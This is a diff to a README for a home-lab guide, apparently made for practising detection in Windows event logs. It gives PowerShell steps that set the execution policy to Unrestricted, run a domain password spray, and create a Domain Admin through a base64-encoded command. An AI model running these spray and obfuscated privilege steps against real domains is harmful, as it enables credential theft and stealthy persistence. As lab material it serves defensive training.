@@ -20,6 +20,7 @@ For more setup scripts and cool stuff, check out the fork of https://github.com/
   - Download and install [Wireshark](https://www.wireshark.org/)
   - Clone [Domain Password Spray from @dafthack](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1)
   - Download both usernames.txt and passlist.txt from this github directory
+  - Sysinternals Suite - https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite
 
 ### 3. Kali Linux
 
@@ -33,20 +34,33 @@ We will cover in all lab demos finding event IDs in windows event viewer, but th
 1. [Domain Password Spray from @dafthack](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1)
    - Right-click, run powershell as admin
 ```
-CD *directory that you've cloned the powershell script into*
+CD **directory where script has been saved**
+
 Get-ExecutionPolicy
+
 Set-ExecutionPolicy Unrestricted
+
 Import-Module .\DomainPasswordSpray.ps1
-https://github.com/dafthack/DomainPasswordSpray
-Cd C:/DNDShare
-Invoke-DomainPasswordSpray -UserList userlist.txt -Domain forgottenforest.local -PasswordList passlist.txt -OutFile sprayed-creds.txt
+
+Invoke-DomainPasswordSpray -UserList userlist.txt -Domain production.local -PasswordList passlist.txt
 ```
 2. Creating a Domain Admin
 - Create a DNDUsers OU in Active Directory Users & Computers on the DC
 ```
-Set-ExecutionPolicy Unrestricted
+Get-ExecutionPolicy
+
 Import-Module ActiveDirectory
-New-ADUser -Name "HP Lovecraft" -GivenName "HP Lovecraft" -SamAccountName "hplovecraft" -UserPrincipalName "hplovecraft@forgottenforest.local" -Path "OU=DNDUsers,DC=domain,DC=local" -AccountPassword(Read-Host -AsSecureString "Type Password for User") -Enabled $true
+
+$command = "New-ADUser -Name 'HP Lovecraft' -GivenName 'HP Lovecraft' -SamAccountName 'hplovecraft' -UserPrincipalName 'hplovecraft@miratime.org' -Path 'OU=TestUsers,DC=miratime,DC=org' -AccountPassword(Read-Host -AsSecureString 'Type Password for User')" 
+
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
+
+$encodedCommand = [Convert]::ToBase64String($bytes) 
+
+powershell.exe -EncodedCommand $encodedCommand
+
+Enable-ADAccount -Identity "hplovecraft"
+
 Add-ADGroupMember -Identity “Domain Admins” -Members hplovecraft
 ```
 3. Data Exfil & Network Forensics
